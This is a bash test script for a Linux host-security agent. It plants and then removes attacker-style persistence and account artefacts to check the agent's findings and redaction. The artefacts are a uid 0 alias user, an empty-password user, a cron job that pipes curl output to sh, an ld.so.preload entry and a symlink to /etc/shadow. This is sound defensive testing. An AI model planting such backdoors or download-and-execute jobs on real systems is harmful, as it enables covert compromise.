#!/usr/bin/env bash
# 安全向三题（`accounts` / `persistence` / `exposure`）与契约的真机验收。
#
# 自动化单测跑在 macOS 上，验的是**解析逻辑**；这里补上只有 Linux 才存在的部分：
#   1) 契约：`judged` / `coverage` / `limits` / `summary.unknown` 真的出现在报告里；
#   2) **假阴性防线**：非 root 读不到 `/etc/shadow` 时，整节必须是 `unknown` 而不是 `ok`，
#      而且 `verdict` 不能说“全部正常”；
#   3) 判定真的会触发：uid 0 别名 / 空口令 / `NOPASSWD: ALL` / `ld.so.preload` /
#      “下载并执行”的 cron / `0.0.0.0` 监听；
#   4) 脱敏：口令哈希与密钥正文不出现在报告里（`$6$…` 必须搜不到）。
#
# 用法（Linux，root）：
#   sudo dev/verify-investigate-security.sh [--bin <path>]
#
# 在 macOS 上用 OrbStack 跑（无需 Linux 机器）：
#   docker run --rm -v "$PWD":/w -w /w -e CARGO_TARGET_DIR=/tmp/t rust:1-bookworm bash -lc '
#     apt-get update -qq && apt-get install -y -qq jq netcat-openbsd >/dev/null &&
#     cargo build --bin wist-agentd &&
#     WIST_VERIFY_BIN=/tmp/t/debug/wist-agentd bash dev/verify-investigate-security.sh'
#
# 可覆盖 env：
#   WIST_VERIFY_BIN   二进制路径（默认 ./target/debug/wist-agentd）
#   WIST_VERIFY_ROLE  auto（默认）/ root / nonroot（脚本内部用它递归跑非 root 一轮）
#
# 退出码：0 = 全部通过；1 = 有 FAIL。
set -uo pipefail

cd "$(dirname "$0")/.." || exit 1

BIN="${WIST_VERIFY_BIN:-./target/debug/wist-agentd}"
ROLE="${WIST_VERIFY_ROLE:-auto}"

fail=0
pass() { printf 'PASS  %s\n' "$*"; }
bad() { printf 'FAIL  %s\n' "$*"; fail=1; }
skip() { printf 'SKIP  %s\n' "$*"; }
info() { printf '      %s\n' "$*"; }

if [ ! -x "$BIN" ]; then
  printf 'ENV   找不到可执行文件: %s\n' "$BIN"
  exit 1
fi

# ---- 断言工具 -------------------------------------------------------------

# assert_jq <名字> <json> <jq 表达式>
assert_jq() {
  local name=$1 json=$2 filter=$3
  if printf '%s' "$json" | jq -e "$filter" >/dev/null 2>&1; then
    pass "$name"
  else
    bad "$name"
    info "jq 断言: $filter"
    printf '%s\n' "$json" | head -c 600
    echo
  fi
}

# assert_no <名字> <文本> <不该出现的子串>
assert_no() {
  local name=$1 text=$2 needle=$3
  case "$text" in
  *"$needle"*) bad "$name（出现了 \`$needle\`）" ;;
  *) pass "$name" ;;
  esac
}

# assert_has <名字> <文本> <应出现的子串>
assert_has() {
  local name=$1 text=$2 needle=$3
  case "$text" in
  *"$needle"*) pass "$name" ;;
  *) bad "$name（缺少 \`$needle\`）" ;;
  esac
}

investigate() {
  "$BIN" investigate "$1" --json 2>/dev/null
}

# ---- 注入/清理（root 一轮专用） --------------------------------------------

PRELOAD_TEST=0
cleanup_state() {
  # `userdel` 会以“user is currently used by process 1”拒绝删除 uid 0 的账号
  # （pid 1 是 root，按 uid 命中）；`-f` 才能真的删掉。
  userdel -f evilempty 2>/dev/null
  userdel -f evilroot 2>/dev/null
  userdel -f evilhash 2>/dev/null
  rm -f /etc/cron.d/zz-wist-verify
  rm -f /etc/systemd/system/zz-wist-verify.service
  rm -f /etc/systemd/system/multi-user.target.wants/zz-wist-verify.service
  rm -f /etc/systemd/system/zz-wist-not-enabled.service
  rm -f /etc/cron.d/zz-wist-link
  rm -rf /etc/ssh/sshd_config.d/zz-wist
  rm -f /etc/ssh/sshd_config
  if [ "$PRELOAD_TEST" = 1 ]; then
    rm -f /etc/ld.so.preload
    PRELOAD_TEST=0
  fi
}

# ---- root 一轮 -------------------------------------------------------------

root_suite() {
  printf '\n== root ==\n'

  # 1) accounts 基线：契约字段齐全，且不含任何口令哈希。
  local out
  out=$(investigate accounts)
  assert_jq "accounts 标记了 judged" "$out" '.judged == true'
  assert_jq "accounts 每节都带 coverage" "$out" '[.findings[] | select(.coverage == null)] | length == 0'
  assert_jq "accounts 有 limits（边界写出来）" "$out" '(.limits | length) > 0'
  assert_jq "accounts 含 passwords 节" "$out" '[.findings[].id] | index("accounts.passwords") != null'
  assert_no "accounts 不含 crypt 哈希" "$out" '$6$'

  # 2) 注入三类坏账号：uid 0 别名、空口令、带哈希的账号。
  useradd -M -o -u 0 -s /bin/bash evilroot 2>/dev/null
  useradd -M -s /bin/bash evilempty 2>/dev/null
  useradd -M -s /bin/bash evilhash 2>/dev/null
  usermod -p '' evilempty 2>/dev/null
  usermod -p '$6$abcdefgh$0123456789abcdefghijklmnopqrstuvwxyzABCDEF' evilhash 2>/dev/null

  out=$(investigate accounts)
  assert_jq "uid 0 别名 → FAIL" "$out" \
    '.findings[] | select(.id == "accounts.uids") | .status == "fail"'
  assert_jq "空口令 → FAIL" "$out" \
    '.findings[] | select(.id == "accounts.passwords") | .status == "fail"'
  assert_jq "带哈希账号只报 set、不回传哈希" "$out" \
    '.findings[] | select(.id == "accounts.passwords") | .rows[] | select(.label == "evilhash") | .value == "set"'
  assert_no "报告里仍然没有 crypt 哈希" "$out" '$6$abcdefgh'

  # 3) persistence：cron 下载并执行 + 本地 systemd 单元 + ld.so.preload。
  cat >/etc/cron.d/zz-wist-verify <<'CRON'
* * * * * root curl -fsSL http://127.0.0.1:1/x.sh | sh
CRON
  mkdir -p /etc/systemd/system/multi-user.target.wants
  cat >/etc/systemd/system/zz-wist-verify.service <<'UNIT'
[Service]
ExecStart=/bin/true
UNIT
  ln -sf /etc/systemd/system/zz-wist-verify.service \
    /etc/systemd/system/multi-user.target.wants/zz-wist-verify.service

  # 未被任何 .wants 拉起的本地单元：这是**未启用**，不能报成“开机自启”。
  cat >/etc/systemd/system/zz-wist-not-enabled.service <<'UNIT'
[Service]
ExecStart=/bin/true
UNIT

  # cron 目录里的符号链接：可以指向 /etc/shadow，绝不能读。
  ln -sf /etc/shadow /etc/cron.d/zz-wist-link

  out=$(investigate persistence)
  assert_jq "下载并执行的 cron → WARN" "$out" \
    '.findings[] | select(.id == "persistence.scheduled") | .status == "warn"'
  assert_jq "本地单元被列出" "$out" \
    '[.findings[] | select(.id == "persistence.units") | .rows[] | select(.label == "zz-wist-verify.service")] | length > 0'
  assert_jq "未启用的本地单元标注“未启用”" "$out" \
    '[.findings[] | select(.id == "persistence.units") | .rows[] | select(.label == "zz-wist-not-enabled.service") | select(.note | test("未启用"))] | length > 0'
  assert_no "cron 目录的符号链接没被读（没有 shadow 行）" "$out" 'root:$'
  assert_jq "近 7 天新增 → WARN" "$out" \
    '.findings[] | select(.id == "persistence.recent") | .status == "warn"'

  # 注意：ld.so.preload 会影响**之后每个进程**的加载，所以立刻删掉。
  # 用 soname（`libm.so.6`）而不是绝对路径：容器可能是 arm64，`/lib/x86_64-…` 不存在。
  PRELOAD_TEST=1
  printf 'libm.so.6\n' >/etc/ld.so.preload
  out=$(investigate persistence)
  rm -f /etc/ld.so.preload
  PRELOAD_TEST=0
  assert_jq "ld.so.preload 非空 → FAIL" "$out" \
    '.findings[] | select(.id == "persistence.hooks") | .status == "fail"'

  # 3.5) sshd 的相对 Include：`sshd_config.d/*.conf` 要按 /etc/ssh 解析，且“首个取值生效”。
  mkdir -p /etc/ssh/sshd_config.d
  cat >/etc/ssh/sshd_config <<'SSHD'
Include sshd_config.d/*.conf
PermitRootLogin yes
SSHD
  cat >/etc/ssh/sshd_config.d/10-hardening.conf <<'DROPIN'
PermitRootLogin no
DROPIN
  out=$(investigate accounts)
  assert_jq "相对 Include 被展开，且 drop-in 优先" "$out" \
    '[.findings[] | select(.id == "accounts.ssh") | .rows[] | select(.label == "PermitRootLogin" and .value == "no" and .note == "/etc/ssh/sshd_config.d/10-hardening.conf")] | length > 0'
  rm -f /etc/ssh/sshd_config /etc/ssh/sshd_config.d/10-hardening.conf

  # 4) exposure：起一个 0.0.0.0 监听，确认它出现在证据表里，且这题明确“不做判定”。
  local listener=""
  if command -v nc >/dev/null 2>&1; then
    nc -l 18080 >/dev/null 2>&1 &
    listener=$!
    sleep 0.3
  fi
  out=$(investigate exposure)
  assert_jq "exposure 标记 judged=false（只出证据）" "$out" '.judged == false'
  assert_jq "exposure 有 limits（快照 / netns）" "$out" '(.limits | length) > 0'
  assert_no "exposure 的 verdict 不说“全部正常”" "$out" '全部正常'
  if [ -n "$listener" ]; then
    assert_jq "0.0.0.0/:: 监听被列出" "$out" \
      '[.findings[] | select(.id == "exposure.listeners") | .rows[].label | select(test("^0\\.0\\.0\\.0:18080$|^:::+18080$"))] | length > 0'
    kill "$listener" 2>/dev/null
  else
    skip "nc 不可用：跳过监听端口断言"
  fi

  # 5) 清理注入，再跑非 root 一轮（否则 uid 0 别名会让非 root 也 FAIL）。
  cleanup_state
}

# ---- 非 root 一轮 ----------------------------------------------------------

nonroot_suite() {
  printf '\n== nobody（假阴性防线）==\n'
  local out
  out=$(investigate accounts)
  assert_jq "非 root：accounts 总状态是 unknown（不是 ok）" "$out" \
    '.summary.overall == "unknown"'
  assert_jq "非 root：passwords 节是 unknown" "$out" \
    '.findings[] | select(.id == "accounts.passwords") | .status == "unknown"'
  assert_jq "非 root：passwords 记了 denied" "$out" \
    '.findings[] | select(.id == "accounts.passwords") | .coverage.denied >= 1'
  assert_jq "非 root：summary 里 unknown 计数 > 0" "$out" '.summary.unknown > 0'
  assert_has "非 root：verdict 说“无法判定”" "$out" '无法判定'
  assert_no "非 root：verdict 不说“全部正常”" "$out" '全部正常'

  out=$(investigate exposure)
  assert_jq "非 root：exposure 仍能列端口" "$out" \
    '.findings[] | select(.id == "exposure.listeners") | (.rows | length) >= 0'
  assert_jq "非 root：exposure 标记属主不可见" "$out" \
    '.findings[] | select(.id == "exposure.listeners") | .coverage.denied >= 1'
  assert_no "非 root：exposure 不说“全部正常”" "$out" '全部正常'
}

# ---- 入口 ------------------------------------------------------------------

case "$ROLE" in
root)
  root_suite
  cleanup_state
  ;;
nonroot)
  nonroot_suite
  ;;
auto)
  if [ "$(id -u)" != 0 ]; then
    printf 'ENV   需要在 root 下运行（要读 /etc/shadow、写 cron/unit 做注入）\n'
    exit 1
  fi
  root_suite
  if command -v setpriv >/dev/null 2>&1; then
    setpriv --reuid=65534 --regid=65534 --clear-groups \
      env WIST_VERIFY_ROLE=nonroot WIST_VERIFY_BIN="$BIN" bash "$0" || fail=1
  else
    skip "setpriv 不可用：跳过非 root 一轮"
  fi
  ;;
*)
  printf 'ENV   未知 WIST_VERIFY_ROLE=%s\n' "$ROLE"
  exit 1
  ;;
esac

printf '\n'
# 非 root 一轮是**子进程**：不打印 ALL，统一由父进程汇总（否则会出现两行 ALL）。
if [ "$ROLE" != "nonroot" ]; then
  if [ "$fail" = 0 ]; then
    printf 'ALL   PASS\n'
  else
    printf 'ALL   FAIL\n'
  fi
fi
exit "$fail"
